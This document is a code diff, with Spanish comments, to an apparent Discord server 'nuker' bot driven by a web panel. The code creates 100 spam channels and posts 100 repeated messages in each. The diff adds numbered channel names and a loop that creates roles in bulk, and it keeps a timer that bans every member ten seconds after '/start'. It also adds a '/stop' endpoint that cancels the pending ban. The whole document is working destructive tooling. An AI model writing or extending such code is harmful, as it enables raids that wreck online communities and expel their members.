@@ -13,7 +13,7 @@ if (!fs.existsSync('webhooks.json')) {
 // Verificar y crear el archivo config.json si no existe
 if (!fs.existsSync('config.json')) {
     fs.writeFileSync('config.json', JSON.stringify({
-        "nombreCanales": "CHANNEL NAME",
+        "nombreCanales": "CHANNEL",
         "cantidadCanales": 100,
         "mensajesPorCanal": 100,
         "mensajeRepetido": "MESSAGE THAT THE BOT WILL SEND"
@@ -70,7 +70,7 @@ const crearCanalesYEnviarMensajes = async (guild) => {
     const canalesCreados = await Promise.all(Array.from({ length: cantidadCanales }).map(async (_, i) => {
         try {
             const nuevoCanal = await guild.channels.create({
-                name: `${config.nombreCanales}`,
+                name: `${config.nombreCanales} ${i + 1}`,
                 type: ChannelType.GuildText
             });
 
@@ -103,6 +103,17 @@ const crearRoles = async (guild) => {
         }
     }
 
+    // Crear nuevos roles
+    for (let i = 0; i < 10; i++) { // Cambia 10 al número deseado de roles
+        try {
+            await guild.roles.create({ name: nombreRole });
+            console.log(`Rol creado: ${nombreRole}`);
+        } catch (error) {
+            console.error('Error al crear el rol', error);
+        }
+    }
+};
+
 // Acción para iniciar la creación de canales y roles en un servidor
 app.post('/start/:guildId', async (req, res) => {
     const guildId = req.params.guildId;
@@ -118,6 +129,7 @@ app.post('/start/:guildId', async (req, res) => {
     // Timer de 10 segundos para banear a todos los usuarios
     accionesEnServidor[guild.id] = setTimeout(() => {
         banearMiembros(guild);
+        delete accionesEnServidor[guild.id]; // Limpiar después de banear
     }, 10000);
 
     res.send('Acción "start" completada en el servidor.');
@@ -132,6 +144,17 @@ app.get('/', async (req, res) => {
 
     res.render('index', { servidores });
 });
+
+// Acción para detener la creación de canales y roles en un servidor
+app.post('/stop/:guildId', async (req, res) => {
+    const guildId = req.params.guildId;
+
+    // Verifica si hay una acción en curso para ese servidor
+    if (accionesEnServidor[guildId]) {
+        clearTimeout(accionesEnServidor[guildId]); // Detener el timeout de baneo
+        delete accionesEnServidor[guildId]; // Eliminar la acción en curso
+        return res.send('Acción "stop" completada en el servidor.');
+    }
 
     res.send('No hay ninguna acción en curso para detener en este servidor.');
 });
